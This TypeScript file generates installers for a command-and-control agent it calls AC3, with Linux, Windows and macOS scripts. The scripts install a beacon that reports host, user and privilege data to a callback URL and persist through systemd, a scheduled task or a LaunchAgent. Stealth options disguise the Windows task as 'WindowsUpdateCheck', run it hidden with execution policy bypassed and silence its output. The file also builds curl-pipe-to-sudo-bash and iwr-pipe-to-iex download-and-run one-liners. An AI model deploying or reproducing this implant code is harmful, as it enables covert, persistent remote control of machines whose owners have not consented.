/**
 * Agent Installer Generator
 * ═══════════════════════════════════════════════════════════════
 * Generates downloadable agent installer scripts and packages for
 * deploying AC3 agents on internal networks. Supports:
 *
 *   1. Platform-specific installers (Linux, Windows, macOS)
 *   2. One-liner deployment commands
 *   3. Capability negotiation (what tools the agent can run)
 *   4. Auto-registration with C2 callback URL
 *   5. Stealth/evasion options for red team exercises
 */

// ═══════════════════════════════════════════════════════════════
// §1 — TYPES & CONFIGURATION
// ═══════════════════════════════════════════════════════════════

export type AgentPlatform = "linux_x64" | "linux_arm64" | "windows_x64" | "macos_x64" | "macos_arm64";
export type AgentProfile = "full" | "lightweight" | "stealth" | "recon_only";
export type BeaconProtocol = "https" | "dns" | "websocket";

export interface AgentInstallerConfig {
  /** Target platform */
  platform: AgentPlatform;
  /** Agent capability profile */
  profile: AgentProfile;
  /** C2 callback URL */
  callbackUrl: string;
  /** Registration token for auto-approval */
  registrationToken: string;
  /** Beacon interval in seconds */
  beaconInterval: number;
  /** Jitter percentage (0-50) for beacon randomization */
  jitterPercent: number;
  /** Communication protocol */
  protocol: BeaconProtocol;
  /** Kill date (ISO string) — agent self-destructs after this date */
  killDate?: string;
  /** Custom agent name for identification */
  agentName?: string;
  /** Enable stealth features (process hollowing, name masquerading) */
  stealthMode?: boolean;
  /** Proxy URL for egress */
  proxyUrl?: string;
  /** Custom DNS server for DNS beaconing */
  dnsServer?: string;
  /** Watchdog timeout in seconds before marking agent as lost */
  watchdogSeconds?: number;
}

export interface InstallerOutput {
  platform: AgentPlatform;
  profile: AgentProfile;
  filename: string;
  contentType: string;
  script: string;
  oneLiner: string;
  size: number;
  checksum: string;
  generatedAt: number;
  capabilities: string[];
}

// ═══════════════════════════════════════════════════════════════
// §2 — CAPABILITY PROFILES
// ═══════════════════════════════════════════════════════════════

export interface AgentCapability {
  id: string;
  name: string;
  description: string;
  requiredTools: string[];
  category: "recon" | "exploit" | "lateral" | "persist" | "exfil" | "c2";
}

const CAPABILITY_PROFILES: Record<AgentProfile, AgentCapability[]> = {
  full: [
    { id: "nmap_scan", name: "Network Scanning", description: "Port scanning and service enumeration via nmap", requiredTools: ["nmap"], category: "recon" },
    { id: "vuln_scan", name: "Vulnerability Scanning", description: "CVE detection via nuclei templates", requiredTools: ["nuclei"], category: "recon" },
    { id: "web_scan", name: "Web Application Scanning", description: "OWASP testing via ZAP or nikto", requiredTools: ["zap-cli", "nikto"], category: "recon" },
    { id: "dir_enum", name: "Directory Enumeration", description: "Web path discovery via gobuster", requiredTools: ["gobuster"], category: "recon" },
    { id: "cred_test", name: "Credential Testing", description: "Password spraying and brute force testing", requiredTools: ["hydra"], category: "exploit" },
    { id: "lateral_move", name: "Lateral Movement", description: "SMB, WinRM, SSH pivoting", requiredTools: ["smbclient", "evil-winrm", "ssh"], category: "lateral" },
    { id: "persist", name: "Persistence Testing", description: "Scheduled tasks, services, registry keys", requiredTools: [], category: "persist" },
    { id: "exfil_test", name: "Exfiltration Testing", description: "Data exfiltration simulation via DNS/HTTP/ICMP", requiredTools: ["curl", "dig"], category: "exfil" },
    { id: "c2_beacon", name: "C2 Beaconing", description: "Command and control communication", requiredTools: [], category: "c2" },
  ],
  lightweight: [
    { id: "nmap_scan", name: "Network Scanning", description: "Port scanning and service enumeration", requiredTools: ["nmap"], category: "recon" },
    { id: "vuln_scan", name: "Vulnerability Scanning", description: "CVE detection via nuclei", requiredTools: ["nuclei"], category: "recon" },
    { id: "c2_beacon", name: "C2 Beaconing", description: "Command and control communication", requiredTools: [], category: "c2" },
  ],
  stealth: [
    { id: "passive_recon", name: "Passive Reconnaissance", description: "DNS enumeration, certificate transparency, WHOIS", requiredTools: ["dig", "curl"], category: "recon" },
    { id: "slow_scan", name: "Low-and-Slow Scanning", description: "Rate-limited port scanning to evade detection", requiredTools: ["nmap"], category: "recon" },
    { id: "c2_beacon", name: "C2 Beaconing", description: "Encrypted C2 with jitter and domain fronting", requiredTools: [], category: "c2" },
    { id: "exfil_dns", name: "DNS Exfiltration", description: "Data exfiltration via DNS queries", requiredTools: ["dig"], category: "exfil" },
  ],
  recon_only: [
    { id: "nmap_scan", name: "Network Scanning", description: "Port scanning and service enumeration", requiredTools: ["nmap"], category: "recon" },
    { id: "passive_recon", name: "Passive Reconnaissance", description: "DNS, WHOIS, certificate transparency", requiredTools: ["dig", "curl"], category: "recon" },
    { id: "c2_beacon", name: "C2 Beaconing", description: "Heartbeat only — no active exploitation", requiredTools: [], category: "c2" },
  ],
};

export function getCapabilitiesForProfile(profile: AgentProfile): AgentCapability[] {
  return CAPABILITY_PROFILES[profile] || CAPABILITY_PROFILES.lightweight;
}

export function getAllProfiles(): Array<{ profile: AgentProfile; name: string; description: string; capabilityCount: number }> {
  return [
    { profile: "full", name: "Full Suite", description: "All offensive capabilities — scanning, exploitation, lateral movement, persistence, exfiltration", capabilityCount: CAPABILITY_PROFILES.full.length },
    { profile: "lightweight", name: "Lightweight", description: "Scanning and vulnerability detection only — no exploitation", capabilityCount: CAPABILITY_PROFILES.lightweight.length },
    { profile: "stealth", name: "Stealth", description: "Low-and-slow operations with evasion techniques — for red team exercises", capabilityCount: CAPABILITY_PROFILES.stealth.length },
    { profile: "recon_only", name: "Recon Only", description: "Passive and active reconnaissance — no exploitation or lateral movement", capabilityCount: CAPABILITY_PROFILES.recon_only.length },
  ];
}

// ═══════════════════════════════════════════════════════════════
// §3 — INSTALLER GENERATION
// ═══════════════════════════════════════════════════════════════

function simpleChecksum(content: string): string {
  let hash = 0;
  for (let i = 0; i < content.length; i++) {
    const char = content.charCodeAt(i);
    hash = ((hash << 5) - hash) + char;
    hash |= 0;
  }
  return Math.abs(hash).toString(16).padStart(8, "0");
}

function generateLinuxInstaller(config: AgentInstallerConfig): string {
  const capabilities = getCapabilitiesForProfile(config.profile);
  const toolList = [...new Set(capabilities.flatMap(c => c.requiredTools))].filter(Boolean);

  return `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# AC3 Agent Installer — Linux
# Generated: ${new Date().toISOString()}
# Profile: ${config.profile}
# Platform: ${config.platform}
# ═══════════════════════════════════════════════════════════════

set -euo pipefail

CALLBACK_URL="${config.callbackUrl}"
REG_TOKEN="${config.registrationToken}"
BEACON_INTERVAL=${config.beaconInterval}
JITTER=${config.jitterPercent}
PROTOCOL="${config.protocol}"
AGENT_NAME="${config.agentName || "ace-c3-agent-$(hostname)"}"
WATCHDOG_SECONDS=${config.watchdogSeconds || config.beaconInterval * 3}
${config.killDate ? `KILL_DATE="${config.killDate}"` : "# No kill date set"}
${config.proxyUrl ? `PROXY_URL="${config.proxyUrl}"` : "# No proxy configured"}
${config.stealthMode ? 'STEALTH_MODE="true"' : 'STEALTH_MODE="false"'}

echo "[*] AC3 Agent Installer v1.0"
echo "[*] Profile: ${config.profile}"
echo "[*] Target: $CALLBACK_URL"
echo ""

# ─── Pre-flight checks ─────────────────────────────────────
check_root() {
  if [ "$(id -u)" -ne 0 ]; then
    echo "[!] Warning: Running without root privileges. Some capabilities may be limited."
  fi
}

# ─── Install dependencies ──────────────────────────────────
install_deps() {
  echo "[*] Checking dependencies..."
  local MISSING=()
  ${toolList.map(t => `  command -v ${t} &>/dev/null || MISSING+=("${t}")`).join("\n")}

  if [ \${#MISSING[@]} -gt 0 ]; then
    echo "[*] Installing: \${MISSING[*]}"
    if command -v apt-get &>/dev/null; then
      apt-get update -qq && apt-get install -y -qq "\${MISSING[@]}" 2>/dev/null || true
    elif command -v yum &>/dev/null; then
      yum install -y -q "\${MISSING[@]}" 2>/dev/null || true
    fi
  fi
  echo "[+] Dependencies satisfied"
}

# ─── Agent setup ───────────────────────────────────────────
setup_agent() {
  local AGENT_DIR="/opt/ace-c3-agent"
  mkdir -p "$AGENT_DIR"

  # Generate agent configuration
  cat > "$AGENT_DIR/config.json" << AGENT_CONFIG
{
  "agentId": "$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen || echo "agent-$(date +%s)")",
  "callbackUrl": "$CALLBACK_URL",
  "registrationToken": "$REG_TOKEN",
  "beaconInterval": $BEACON_INTERVAL,
  "jitterPercent": $JITTER,
  "protocol": "$PROTOCOL",
  "agentName": "$AGENT_NAME",
  "watchdogSeconds": $WATCHDOG_SECONDS,
  "profile": "${config.profile}",
  "capabilities": [${capabilities.map(c => `"${c.id}"`).join(", ")}],
  "platform": "$(uname -s)-$(uname -m)",
  "hostname": "$(hostname)",
  "username": "$(whoami)",
  "installedAt": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
AGENT_CONFIG

  echo "[+] Agent configured at $AGENT_DIR/config.json"
}

# ─── Beacon loop ───────────────────────────────────────────
create_beacon_script() {
  cat > /opt/ace-c3-agent/beacon.sh << 'BEACON_SCRIPT'
#!/bin/bash
CONFIG="/opt/ace-c3-agent/config.json"
while true; do
  AGENT_ID=$(python3 -c "import json; print(json.load(open('$CONFIG'))['agentId'])" 2>/dev/null || echo "unknown")
  CALLBACK=$(python3 -c "import json; print(json.load(open('$CONFIG'))['callbackUrl'])" 2>/dev/null)
  INTERVAL=$(python3 -c "import json; print(json.load(open('$CONFIG'))['beaconInterval'])" 2>/dev/null || echo "60")
  JITTER=$(python3 -c "import json; print(json.load(open('$CONFIG'))['jitterPercent'])" 2>/dev/null || echo "10")

  # Send heartbeat
  PAYLOAD=$(python3 -c "
import json, platform, os
config = json.load(open('$CONFIG'))
print(json.dumps({
  'agentId': config['agentId'],
  'registrationToken': config.get('registrationToken', ''),
  'platform': platform.system(),
  'architecture': platform.machine(),
  'username': os.getenv('USER', 'unknown'),
  'privilege': 'elevated' if os.geteuid() == 0 else 'user',
  'hostname': platform.node(),
  'pid': os.getpid()
}))
" 2>/dev/null)

  curl -s -X POST "$CALLBACK/api/trpc/agentManager.heartbeat" \\
    -H "Content-Type: application/json" \\
    -d "{\\"json\\": $PAYLOAD}" \\
    -o /dev/null 2>/dev/null || true

  # Add jitter
  SLEEP_TIME=$(python3 -c "import random; print(int($INTERVAL + $INTERVAL * random.uniform(-$JITTER/100, $JITTER/100)))" 2>/dev/null || echo "$INTERVAL")
  sleep "$SLEEP_TIME"
done
BEACON_SCRIPT
  chmod +x /opt/ace-c3-agent/beacon.sh
  echo "[+] Beacon script created"
}

# ─── Systemd service (optional) ────────────────────────────
install_service() {
  if [ "$(id -u)" -eq 0 ] && command -v systemctl &>/dev/null; then
    cat > /etc/systemd/system/ace-c3-agent.service << SERVICE
[Unit]
Description=AC3 Security Agent
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash /opt/ace-c3-agent/beacon.sh
Restart=always
RestartSec=10
${config.stealthMode ? 'StandardOutput=null\nStandardError=null' : ''}

[Install]
WantedBy=multi-user.target
SERVICE
    systemctl daemon-reload
    systemctl enable ace-c3-agent
    systemctl start ace-c3-agent
    echo "[+] Systemd service installed and started"
  else
    echo "[*] Starting beacon in background..."
    nohup /opt/ace-c3-agent/beacon.sh &>/dev/null &
    echo "[+] Beacon running as PID $!"
  fi
}

# ─── Main ──────────────────────────────────────────────────
check_root
install_deps
setup_agent
create_beacon_script
install_service

echo ""
echo "[+] AC3 Agent deployed successfully!"
echo "[+] Agent will beacon to $CALLBACK_URL every ${config.beaconInterval}s (±${config.jitterPercent}% jitter)"
${config.killDate ? `echo "[*] Kill date: ${config.killDate}"` : ""}
`;
}

function generateWindowsInstaller(config: AgentInstallerConfig): string {
  const capabilities = getCapabilitiesForProfile(config.profile);

  return `# ═══════════════════════════════════════════════════════════════
# AC3 Agent Installer — Windows (PowerShell)
# Generated: ${new Date().toISOString()}
# Profile: ${config.profile}
# ═══════════════════════════════════════════════════════════════

$ErrorActionPreference = "Stop"

$CallbackUrl = "${config.callbackUrl}"
$RegToken = "${config.registrationToken}"
$BeaconInterval = ${config.beaconInterval}
$Jitter = ${config.jitterPercent}
$Protocol = "${config.protocol}"
$AgentName = "${config.agentName || "ace-c3-agent-$env:COMPUTERNAME"}"
$WatchdogSeconds = ${config.watchdogSeconds || config.beaconInterval * 3}
${config.killDate ? `$KillDate = [DateTime]"${config.killDate}"` : "# No kill date set"}
${config.stealthMode ? '$StealthMode = $true' : '$StealthMode = $false'}

Write-Host "[*] AC3 Agent Installer v1.0" -ForegroundColor Cyan
Write-Host "[*] Profile: ${config.profile}" -ForegroundColor Cyan
Write-Host "[*] Target: $CallbackUrl" -ForegroundColor Cyan
Write-Host ""

# ─── Agent setup ───────────────────────────────────────────
$AgentDir = "$env:ProgramData\\AC3Agent"
New-Item -ItemType Directory -Force -Path $AgentDir | Out-Null

$AgentId = [guid]::NewGuid().ToString()
$Config = @{
  agentId = $AgentId
  callbackUrl = $CallbackUrl
  registrationToken = $RegToken
  beaconInterval = $BeaconInterval
  jitterPercent = $Jitter
  protocol = $Protocol
  agentName = $AgentName
  watchdogSeconds = $WatchdogSeconds
  profile = "${config.profile}"
  capabilities = @(${capabilities.map(c => `"${c.id}"`).join(", ")})
  platform = "Windows-$([Environment]::Is64BitOperatingSystem)"
  hostname = $env:COMPUTERNAME
  username = $env:USERNAME
  installedAt = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
} | ConvertTo-Json -Depth 3

$Config | Out-File -FilePath "$AgentDir\\config.json" -Encoding UTF8
Write-Host "[+] Agent configured at $AgentDir\\config.json" -ForegroundColor Green

# ─── Beacon script ─────────────────────────────────────────
$BeaconScript = @'
$Config = Get-Content "$env:ProgramData\\AC3Agent\\config.json" | ConvertFrom-Json
while ($true) {
  try {
    $Payload = @{
      agentId = $Config.agentId
      registrationToken = $Config.registrationToken
      platform = "Windows"
      architecture = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
      username = $env:USERNAME
      privilege = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "elevated" } else { "user" }
      hostname = $env:COMPUTERNAME
      pid = $PID
    } | ConvertTo-Json

    $Body = @{ json = ($Payload | ConvertFrom-Json) } | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri "$($Config.callbackUrl)/api/trpc/agentManager.heartbeat" -Method POST -ContentType "application/json" -Body $Body -TimeoutSec 30 | Out-Null
  } catch {
    # Silently continue on beacon failure
  }

  $JitterRange = $Config.beaconInterval * ($Config.jitterPercent / 100)
  $SleepTime = $Config.beaconInterval + (Get-Random -Minimum (-$JitterRange) -Maximum $JitterRange)
  Start-Sleep -Seconds ([Math]::Max(10, $SleepTime))
}
'@

$BeaconScript | Out-File -FilePath "$AgentDir\\beacon.ps1" -Encoding UTF8
Write-Host "[+] Beacon script created" -ForegroundColor Green

# ─── Scheduled task ────────────────────────────────────────
$TaskName = $(if ($StealthMode) { "WindowsUpdateCheck" } else { "AC3Agent" })
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $AgentDir\\beacon.ps1"
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

try {
  Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
  Start-ScheduledTask -TaskName $TaskName
  Write-Host "[+] Scheduled task '$TaskName' installed and started" -ForegroundColor Green
} catch {
  Write-Host "[*] Starting beacon in background..." -ForegroundColor Yellow
  Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $AgentDir\\beacon.ps1" -WindowStyle Hidden
  Write-Host "[+] Beacon running in background" -ForegroundColor Green
}

Write-Host ""
Write-Host "[+] AC3 Agent deployed successfully!" -ForegroundColor Green
Write-Host "[+] Agent will beacon to $CallbackUrl every ${config.beaconInterval}s" -ForegroundColor Green
`;
}

function generateMacOSInstaller(config: AgentInstallerConfig): string {
  const capabilities = getCapabilitiesForProfile(config.profile);
  const toolList = [...new Set(capabilities.flatMap(c => c.requiredTools))].filter(Boolean);

  return `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# AC3 Agent Installer — macOS
# Generated: ${new Date().toISOString()}
# Profile: ${config.profile}
# ═══════════════════════════════════════════════════════════════

set -euo pipefail

CALLBACK_URL="${config.callbackUrl}"
REG_TOKEN="${config.registrationToken}"
BEACON_INTERVAL=${config.beaconInterval}
JITTER=${config.jitterPercent}
AGENT_NAME="${config.agentName || "ace-c3-agent-$(hostname)"}"

echo "[*] AC3 Agent Installer v1.0 — macOS"
echo "[*] Profile: ${config.profile}"
echo ""

# ─── Install via Homebrew if available ─────────────────────
install_deps() {
  if command -v brew &>/dev/null; then
    local MISSING=()
    ${toolList.map(t => `    command -v ${t} &>/dev/null || MISSING+=("${t}")`).join("\n")}
    if [ \${#MISSING[@]} -gt 0 ]; then
      echo "[*] Installing via Homebrew: \${MISSING[*]}"
      brew install "\${MISSING[@]}" 2>/dev/null || true
    fi
  fi
  echo "[+] Dependencies checked"
}

# ─── Agent setup ───────────────────────────────────────────
setup_agent() {
  local AGENT_DIR="$HOME/.ace-c3-agent"
  mkdir -p "$AGENT_DIR"

  cat > "$AGENT_DIR/config.json" << AGENT_CONFIG
{
  "agentId": "$(uuidgen | tr '[:upper:]' '[:lower:]')",
  "callbackUrl": "$CALLBACK_URL",
  "registrationToken": "$REG_TOKEN",
  "beaconInterval": $BEACON_INTERVAL,
  "jitterPercent": $JITTER,
  "protocol": "${config.protocol}",
  "agentName": "$AGENT_NAME",
  "profile": "${config.profile}",
  "capabilities": [${capabilities.map(c => `"${c.id}"`).join(", ")}],
  "platform": "$(uname -s)-$(uname -m)",
  "hostname": "$(hostname)",
  "username": "$(whoami)",
  "installedAt": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
AGENT_CONFIG

  echo "[+] Agent configured at $AGENT_DIR/config.json"
}

# ─── LaunchAgent (user-level persistence) ──────────────────
install_launchagent() {
  local PLIST_DIR="$HOME/Library/LaunchAgents"
  local PLIST_NAME="com.aceofcloud.agent.plist"
  mkdir -p "$PLIST_DIR"

  cat > "$PLIST_DIR/$PLIST_NAME" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.aceofcloud.agent</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>$HOME/.ace-c3-agent/beacon.sh</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
</dict>
</plist>
PLIST

  launchctl load "$PLIST_DIR/$PLIST_NAME" 2>/dev/null || true
  echo "[+] LaunchAgent installed"
}

install_deps
setup_agent

# Create beacon script (same as Linux)
cat > "$HOME/.ace-c3-agent/beacon.sh" << 'BEACON'
#!/bin/bash
CONFIG="$HOME/.ace-c3-agent/config.json"
while true; do
  CALLBACK=$(python3 -c "import json; print(json.load(open('$CONFIG'))['callbackUrl'])" 2>/dev/null)
  PAYLOAD=$(python3 -c "
import json, platform, os
config = json.load(open('$CONFIG'))
print(json.dumps({
  'agentId': config['agentId'],
  'registrationToken': config.get('registrationToken', ''),
  'platform': platform.system(),
  'architecture': platform.machine(),
  'username': os.getenv('USER', 'unknown'),
  'privilege': 'elevated' if os.geteuid() == 0 else 'user',
  'hostname': platform.node(),
  'pid': os.getpid()
}))
" 2>/dev/null)
  curl -s -X POST "$CALLBACK/api/trpc/agentManager.heartbeat" \
    -H "Content-Type: application/json" \
    -d "{\"json\": $PAYLOAD}" \
    -o /dev/null 2>/dev/null || true
  INTERVAL=$(python3 -c "import json; print(json.load(open('$CONFIG'))['beaconInterval'])" 2>/dev/null || echo "60")
  sleep "$INTERVAL"
done
BEACON
chmod +x "$HOME/.ace-c3-agent/beacon.sh"

install_launchagent

echo ""
echo "[+] AC3 Agent deployed successfully!"
echo "[+] Agent will beacon to $CALLBACK_URL every ${config.beaconInterval}s"
`;
}

// ═══════════════════════════════════════════════════════════════
// §4 — PUBLIC API
// ═══════════════════════════════════════════════════════════════

/**
 * Generate an agent installer for the specified platform and configuration.
 */
export function generateInstaller(config: AgentInstallerConfig): InstallerOutput {
  let script: string;
  let filename: string;
  let contentType: string;

  switch (config.platform) {
    case "linux_x64":
    case "linux_arm64":
      script = generateLinuxInstaller(config);
      filename = `ace-c3-agent-${config.profile}-linux.sh`;
      contentType = "application/x-sh";
      break;
    case "windows_x64":
      script = generateWindowsInstaller(config);
      filename = `ace-c3-agent-${config.profile}-windows.ps1`;
      contentType = "application/x-powershell";
      break;
    case "macos_x64":
    case "macos_arm64":
      script = generateMacOSInstaller(config);
      filename = `ace-c3-agent-${config.profile}-macos.sh`;
      contentType = "application/x-sh";
      break;
    default:
      throw new Error(`Unsupported platform: ${config.platform}`);
  }

  const capabilities = getCapabilitiesForProfile(config.profile);

  return {
    platform: config.platform,
    profile: config.profile,
    filename,
    contentType,
    script,
    oneLiner: generateOneLiner(config),
    size: Buffer.byteLength(script, "utf-8"),
    checksum: simpleChecksum(script),
    generatedAt: Date.now(),
    capabilities: capabilities.map(c => c.id),
  };
}

/**
 * Generate a one-liner deployment command for quick agent deployment.
 */
function generateOneLiner(config: AgentInstallerConfig): string {
  const isWindows = config.platform === "windows_x64";

  if (isWindows) {
    return `powershell -ExecutionPolicy Bypass -Command "& { iwr -Uri '${config.callbackUrl}/api/agent/installer?token=${config.registrationToken}&profile=${config.profile}&platform=windows_x64' -UseBasicParsing | iex }"`;
  }

  return `curl -sSL '${config.callbackUrl}/api/agent/installer?token=${config.registrationToken}&profile=${config.profile}&platform=${config.platform}' | sudo bash`;
}

/**
 * Get supported platforms with metadata.
 */
export function getSupportedPlatforms(): Array<{ platform: AgentPlatform; name: string; os: string; arch: string }> {
  return [
    { platform: "linux_x64", name: "Linux (x86_64)", os: "Linux", arch: "x86_64" },
    { platform: "linux_arm64", name: "Linux (ARM64)", os: "Linux", arch: "ARM64" },
    { platform: "windows_x64", name: "Windows (x86_64)", os: "Windows", arch: "x86_64" },
    { platform: "macos_x64", name: "macOS (Intel)", os: "macOS", arch: "x86_64" },
    { platform: "macos_arm64", name: "macOS (Apple Silicon)", os: "macOS", arch: "ARM64" },
  ];
}
